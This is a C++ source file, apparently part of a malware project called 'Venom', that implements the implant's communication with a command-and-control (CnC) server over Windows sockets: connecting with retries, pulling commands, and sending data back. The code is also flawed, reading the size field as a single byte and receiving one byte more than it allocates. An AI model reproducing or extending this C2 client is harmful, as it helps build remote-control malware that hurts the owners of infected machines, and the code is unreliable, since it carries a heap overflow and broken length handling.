#include "CommunicationHandler.h"

CommunicationHandler::Communicator::Communicator(std::string cncIp, int cncPort)
{
	cncInformation.sin_family = AF_INET;
	cncInformation.sin_port = htons(cncPort);
	inet_pton(AF_INET, cncIp.c_str(), &cncInformation.sin_addr.S_un.S_addr);

	//Initialize the socket
	if (0 != WSAStartup(dllVersion, &wsaData))
		goto Error;

	connectionSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (connectionSocket == INVALID_SOCKET)
		goto Error;

	return;

Error:
	WSACleanup();
}

bool CommunicationHandler::Communicator::connectToCnc()
{
	for (int connectionAttemptCount = 0; connectionAttemptCount < MAXIMUM_CONNECTION_ATTEMPTS; connectionAttemptCount++)
	{
		if (0 == connect(connectionSocket, reinterpret_cast<const sockaddr*>(&cncInformation), sizeof(cncInformation)))
		{
			return STATUS_SUCCESS;
		}
	}

	WSACleanup();
	return STATUS_FAILURE;
}

void CommunicationHandler::Communicator::sendTelemetry()
{
	// Need to implement.
}

bool CommunicationHandler::Communicator::pullCommand(VenomCommands::Command* recievedCommand)
{
	// Get data buffer size.
	char size[4] = { 0 };	
	recv(connectionSocket, size, sizeof(int), 0);
	recievedCommand->size = (int)*size;

	if (recievedCommand->size > 0)
	{
		// Get the command type.
		char commandType[4] = { 0 };
		if (commandType != NULL)
		{
			recv(connectionSocket, commandType, sizeof(int), 0);
			recievedCommand->commandType = (int)*commandType;
		}
		
		// Get the actual data.
		recievedCommand->data = (char*)malloc(recievedCommand->size);
		if (recievedCommand->data != NULL)
		{
			recv(connectionSocket, recievedCommand->data, recievedCommand->size + 1, 0);
		}
	}

	return STATUS_SUCCESS;
}

bool CommunicationHandler::Communicator::sendDataToCnc(const char* buffer)
{
	int resultStatus = 0;

	resultStatus = send(connectionSocket, buffer, (int)strlen(buffer), 0);

	if (resultStatus == SOCKET_ERROR)
		return STATUS_FAILURE;

	return STATUS_SUCCESS;

}

bool CommunicationHandler::Communicator::disconnectFromCnc()
{
	closesocket(connectionSocket);
	connectionSocket = INVALID_SOCKET;
	WSACleanup();

	return STATUS_SUCCESS;
}

CommunicationHandler::Communicator::~Communicator()
{
	WSACleanup();
}